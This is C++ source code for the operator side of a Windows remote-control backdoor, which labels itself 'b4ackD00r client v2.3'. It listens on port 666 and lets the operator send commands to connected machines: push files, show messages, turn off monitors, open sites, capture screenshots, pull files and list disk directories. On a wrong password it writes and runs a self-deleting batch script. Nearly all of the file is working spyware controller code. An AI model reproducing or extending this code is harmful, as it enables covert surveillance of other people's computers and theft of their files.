//Server
//Tastks:: Optimize
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Ws2_32.lib")
#include <WinSock2.h>
#include <iostream>
#include <fstream>
#include <WS2tcpip.h>
#include <string>
#include <conio.h>
#include <thread>
#define PRINTNUSERS if (ClientCount>=0) printf("%d user on-line\n", ClientCount); \
        else printf("No User on-line\n");

SOCKET Connect;
SOCKET* Connections;
SOCKET Listen;

int ClientCount = 0;

bool checkend(char *arr,int len) {
	for (int i = 0; i < len-3; i++) {
		if (arr[i] != '\0')return true;
	}
	return false;

}

void concheck(SOCKET Connect1, SOCKET Listen1, HOSTENT *hst, sockaddr_in client_addr) {
		int client_addr_size = sizeof(client_addr);
		while ((Connect1 = accept(Listen1, (sockaddr*)& client_addr, \
			& client_addr_size)))
		{
			ClientCount++;
			HOSTENT* hst;
			hst = gethostbyaddr((char*)& client_addr.sin_addr.s_addr, 4, AF_INET);
			printf("+%s [%s] new connect!\n",
				(hst) ? hst->h_name : "", inet_ntoa(client_addr.sin_addr));
			PRINTNUSERS
				Connections[ClientCount] = Connect1;
		}
	}

bool start() {
	using namespace std;
	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
	std::string pass="welive";
	std::string greetings = "Hello, user, enter password:\n";
	for (int i = 0; i < greetings.size(); i++) {
		std::cout << greetings[i];
		if (i % 2 == 0)Sleep(250);
		else Sleep(100);
	}
	string input_password;
	char choice;
	unsigned char p;
		do
		{
			p = _getch();

			if (p == 13) break;
			if (p == '\b' && !input_password.empty())
			{
				cout << '\b';
				cout << ' ';
				cout << '\b';

				input_password.pop_back();
				continue;
			}
			if (isalnum((unsigned char)p))
			{
				cout << '*';
				input_password.push_back(p);
			}

		} while (true);

		if (input_password == pass)
		{
			SetConsoleTextAttribute(handle, FOREGROUND_GREEN);
			cout << "\nAccess granted\n";
		}
		else
		{
			SetConsoleTextAttribute(handle, FOREGROUND_RED);
			std::cout << "\nNice try.\n";
			Sleep(1000);
			char delfile[] = "@echo off\n:loop\ndel Server.exe\nif exist 1.txt goto : loop\ndel %0";
			std::ofstream File;
			File.open("del.bat");
			File << delfile;
			File.close();
			system("start del.bat");
			return 0;
		}

		std::string scull[] = {
			"            aad8888888baa                            ",
			"         d:?88888888888?::8b                         ",
			"      d8888:888888888??a888888b                      ",
			"    d8888888a8888888aa8888888888b                    ",
			"   dP        88888888888        Yb                   ",
			"  dP        @Y888888888P        @Yb                  ",
			" d8           Y8888888P           8b                 ",
			" 88            Y88888P            8b                 ",
			" Y8baaaaaaaaaa88P T Y88aaaaaaaaaad8P                 ",
			"   Y88888888888P  |  Y88888888888P                   ",
			"            888   |   888                            ",
			"            8888888888888b                           ",
			"            88888888888888                           ",
			"           d88888888888888                           ",
			"           88  88  88   88                           ",
			"           88  88  88   88                           ",
			"           88  88  P    88                           ",
			"           88  88       88                           ",
		};
		Sleep(3000);
		Sleep(1000);
		SetConsoleTextAttribute(handle, FOREGROUND_RED);
		std::cout << std::endl << "           b4ackD00r client v2.3\n\n";
		Sleep(1000);
		mciSendString("play C:\\Users\\Explo\\source\\repos\\Client\\12.mp3", NULL, 0, NULL);
		for (int i = 0; i < sizeof(scull) / sizeof(*scull); i++) {
			std::cout << "   " << scull[i] << std::endl;
			Sleep(480);
		}

		SetConsoleTextAttribute(handle, 0x7);
		return 1;
	}


int main() {
	setlocale(LC_ALL, "russian");
	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);
	//if (!start())return 0;
	WSAData data;
	WORD version = MAKEWORD(2, 2);
	int res = WSAStartup(version, &data);
	if (res != 0)
	{
		return 0;
	}

	struct addrinfo hints;
	struct addrinfo* result;

	Connections = (SOCKET*)calloc(64, sizeof(SOCKET));

	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_flags = AI_PASSIVE;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	getaddrinfo(NULL, "666", &hints, &result);

	Listen = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	bind(Listen, result->ai_addr, result->ai_addrlen);
	listen(Listen, SOMAXCONN);

	freeaddrinfo(result);

	printf("\nStarting server...");
	sockaddr_in client_addr;

	int client_addr_size = sizeof(client_addr);
	HOSTENT *hst;
	hst = gethostbyaddr((char *)&client_addr.sin_addr.s_addr, 4, AF_INET);
		char m_connect[256] = "--i";
		if (Connect = accept(Listen, (sockaddr*)& client_addr, \
			& client_addr_size)) {
			ClientCount++;
			printf("Client connected\n");
			printf("+%s [%s] new connect!\n",
				(hst) ? hst->h_name : "", inet_ntoa(client_addr.sin_addr));
			PRINTNUSERS
			Connections[ClientCount] = Connect;
			send(Connections[ClientCount], m_connect, strlen(m_connect), NULL);
			std::thread t(concheck, Connect, Listen, hst, client_addr);
			t.detach();
		}
		while (true) {
			char m_connect[256] = "";
			int i = 0;
			int ClientNum = 0;
			std::cout << "Select one of the connected users\n";
			for (int i = 1; i <= ClientCount; i++) {
				std::cout << "[" << i <<"]" << std::endl;
			}
			std::cin >> ClientNum;
			std::cin.clear();
			std::cin.ignore();
			std::cout << "Enter the command:  \n-- s send the file \n--m display the message \n--o turn off the monitor \n--e close the client \n--w open the site \n--c take a screenshot\n--d download file\n dir scan disk\n";
			char a = getchar();
			while (a != '\n') {
				m_connect[i] = a;
				i++;
				a = getchar();
			}
			if (ClientNum != 0) {
					send(Connections[ClientNum], m_connect, strlen(m_connect), NULL);
			}
			else {
				for (int i = 1; i <= ClientCount; i++) {
					send(Connections[i], m_connect, strlen(m_connect), NULL);
				}
			}
			if ((m_connect[0] == '-')&&(m_connect[1]=='-')&&((m_connect[2] == 's'))) {
				const int buflen = 1024;
				std::string file;
				std::cout << "Enter the file path\n";
				FILE *in1;
				std::cin >> file;
				fopen_s(&in1, file.c_str(), "rb");
				long int size;
				fseek(in1, 0, SEEK_END);
				size = ftell(in1);
				fclose(in1);
				char size1[256]="";
				_itoa_s(size,size1,10);
				std::cout << "Sending: " << size1 << " bytes\n";
				strcat_s(size1, "%byte%\0");
				int len = 0;
				for (int i = 0; i < sizeof(size1) / sizeof(size); i++) {
					if (size1[i] != '\0')len++;
					else {
						break;
					}
				}
				send(Connections[ClientCount], size1, len, 0);
				FILE *in;
				fopen_s(&in, file.c_str(), "rb");
				std::cout << "Transfering a file\n";
				int bytesen = 0;
				while (1) {
					char bufer[buflen] = "";
					int b = fread(bufer, 1, sizeof(bufer), in);
					send(Connections[ClientCount], bufer, b, 0);
					if (b < buflen)break;
				}
				fclose(in);
				std::cout << "File has been sent!"<< bytesen<<" bytes\n";
			}
			else if ((m_connect[0] == '-') && (m_connect[1] == '-') && ((m_connect[2] == 'c'))) {
				std::cout << "Trying to upload a screenshot\n";
				HANDLE hFile;
				hFile = CreateFile("screendown.png",
					GENERIC_WRITE,
					0,
					NULL,
					OPEN_ALWAYS,
					FILE_ATTRIBUTE_NORMAL,
					NULL);
				const int bufsize = 1024;
				DWORD dwBytesWritten;
				bool start = true;
				int filesize = 0;
				int bytesrec = 0;
				do {
					int unread = 0;
					bool exit = false;
					char buff[bufsize] = "";
					int nbytes = recv(Connect, buff, sizeof(buff), 0);
					if (start) {
						for (int k = 0; sizeof(buff) / sizeof(char); k++) {
							if ((buff[k] == '%') && (buff[k + 1] == 'b') && (buff[k + 2] == 'y') && (buff[k + 3] == 't') && (buff[k + 4] == 'e') && (buff[k + 5] == '%')) {
								unread += 6;
								char *temp = new char[unread - 6];
								strncpy(temp, buff, unread - 6);
								filesize = atoi(temp);
								delete[]temp;
								break;
							}
							else {
								unread++;
							}
						}
						start = false;
						bytesrec += nbytes - unread;
					}
					else {
						bytesrec += nbytes;
					}
					if (nbytes == 0) {
						break;
					}
					if (nbytes < 0)
					{
						break;
					}
					WriteFile(hFile, buff + unread, nbytes - unread, &dwBytesWritten, NULL);
					} while (bytesrec < filesize);
				CloseHandle(hFile);
			}
			else if ((m_connect[0] == '-') && (m_connect[1] == '-') && ((m_connect[2] == 'd'))) {
				std::cout << "Trying to download file\n";
				HANDLE hFile;
				char download[256] = "";
				std::cout << "Enter filename:\n";
				std::cin >> download;
				hFile = CreateFile(download,
					GENERIC_WRITE,
					0,
					NULL,
					OPEN_ALWAYS,
					FILE_ATTRIBUTE_NORMAL,
					NULL);
				const int bufsize = 1024;
				DWORD dwBytesWritten;
				bool start = true;
				int filesize = 0;
				int bytesrec = 0;
				do {
					int unread = 0;
					bool exit = false;
					char buff[bufsize] = "";
					int nbytes = recv(Connect, buff, sizeof(buff), 0);
					if (start) {
						for (int k = 0; sizeof(buff) / sizeof(char); k++) {
							if ((buff[k] == '%') && (buff[k + 1] == 'b') && (buff[k + 2] == 'y') && (buff[k + 3] == 't') && (buff[k + 4] == 'e') && (buff[k + 5] == '%')) {
								unread += 6;
								char *temp = new char[unread - 6];
								strncpy(temp, buff, unread - 6);
								filesize = atoi(temp);
								delete[]temp;
								break;
							}
							else {
								unread++;
							}
						}
						start = false;
						bytesrec += nbytes - unread;
					}
					else {
						bytesrec += nbytes;
					}
					if (nbytes == 0) {
						break;
					}
					if (nbytes < 0)
					{
						break;
					}
					WriteFile(hFile, buff + unread, nbytes - unread, &dwBytesWritten, NULL);
				} while (bytesrec < filesize);
				CloseHandle(hFile);
			}
			else if ((m_connect[0] == 'd') && (m_connect[1] == 'i') && ((m_connect[2] == 'r'))) {
			char answ;
			std::cout << "Press f to download in file and any button to show directories in the console\n";
			std::cin >> answ;
			if (answ == 'f') {
				std::cout << "Trying to download file\n";
				HANDLE hFile;
				hFile = CreateFile("files.txt",
					GENERIC_WRITE,
					0,
					NULL,
					OPEN_ALWAYS,
					FILE_ATTRIBUTE_NORMAL,
					NULL);
				const int bufsize = 1024;
				DWORD dwBytesWritten;
				while (1) {
					bool exit = false;
					char buff[bufsize] = "";
					int nbytes = recv(Connect, buff, sizeof(buff), 0);
					if ((nbytes == 1) && (buff[0]=='0')) {
						std::cout << "Error (INVALID_HANDLE_VALUE)"; break;
					}
					if (nbytes == 0) {
						std::cout << "File loaded\n"; break;
					}
					if (nbytes < 0)
					{
						break;
					}
					int work = 0;
					bool find = false;
					for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
						if ((buff[i] == '\0') && (!find)) { work = 1023 - i; buff[i] = '\n'; find = true; }
						if ((buff[i] == '^') && (buff[i + 1] == '@') && (buff[i + 2] == '@')) { exit = true; }
					}
					if (exit) {
						if (!checkend(buff, bufsize)) {
							std::cout << "File loaded\n"; break;
						}
						WriteFile(hFile, buff, nbytes - 3, &dwBytesWritten, NULL);
						std::cout << "File loaded\n"; break;
					}
					else {
						WriteFile(hFile, buff, nbytes - work, &dwBytesWritten, NULL);
					}
				}
				CloseHandle(hFile);
			}
			else {
				const int bufsize = 1024;
				bool exit = false;
				while (1) {
					char buff[bufsize] = "";
					int nbytes = recv(Connect, buff, sizeof(buff), 0);
					if ((nbytes == 1)&&(buff[0]=='0')) {
						std::cout << "Error (INVALID_HANDLE_VALUE)\n"; break;
					}
					if (nbytes == 0) {
						std::cout << "File loaded\n"; break;
					}
					if (nbytes < 0)
					{
						break;
					}
					int work = 0;
					bool find = false;
					for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
						if ((buff[i] == '^') && (buff[i + 1] == '@') && (buff[i + 2] == '@')) { exit = true; break;}
					}
					if (exit) {
						std::cout << "\nFile loaded\n";
						break;
					}
					else {
						std::cout << buff << std::endl;
					}
				}
			}
			}
		}
	return 1;
}
